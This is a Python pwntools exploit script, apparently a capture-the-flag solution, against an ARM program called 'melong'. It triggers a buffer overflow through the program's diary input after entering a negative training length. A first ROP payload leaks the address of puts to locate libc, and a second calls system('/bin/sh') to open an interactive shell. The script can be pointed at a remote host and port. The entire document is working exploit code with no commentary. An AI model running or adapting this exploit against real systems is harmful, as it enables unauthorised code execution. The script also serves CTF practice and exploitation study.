#!/usr/bin/env python3

from pwn import *

localfile = "./melong"
locallibc = "libc.so.6"
context.binary = localfile
context.log_level = "debug"
pf      = lambda name,num           :log.info(name + ": 0x%x" % num)
g       = lambda x                  :next(libc.search(asm(x)))

def check():
    io.recvuntil("Type the number:")
    io.sendline("1")
    io.recvuntil("Your height(meters) : ")
    io.sendline("1")
    io.recvuntil("Your weight(kilograms) : ")
    io.sendline("1")

def PT(num):
    io.recvuntil("Type the number:")
    io.sendline("3")
    io.recvuntil("How long do you want to take personal training?\n")
    io.sendline(str(num))

def write_diary(content):
    io.recvuntil("Type the number:")
    io.sendline("4")
    io.send(content)

def exit():
    io.recvuntil("Type the number:")
    io.sendline("6")

# gadgets
# 0x00011bbc : pop {r0, pc}
def exp():
    g1 = 0x00011bbc

    check()
    # gdb.attach(io, """b *0x11288
    # b *0x1118C
    # """)
    PT(-1)
    payload1 = b"A"*0x54 + p32(g1) + p32(elf.got["puts"]) + p32(elf.plt["puts"]) + p32(elf.sym["main"])*6
    write_diary(payload1)
    exit()

    io.recvuntil("See you again :)\n")
    puts_addr = u32(io.recv(4))
    pf("puts_addr", puts_addr)
    libc.address = puts_addr - libc.sym["puts"]
    
    check()
    PT(-1)
    payload2 = b"A"*0x54 + p32(g1) + p32(next(libc.search(b"/bin/sh"))) + p32(libc.sym["system"])
    write_diary(payload2)
    exit()

    io.interactive()

argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)

io = process(["qemu-arm", "-g", "1234", localfile])
elf = ELF(localfile)
libc = ELF(locallibc)
exp()
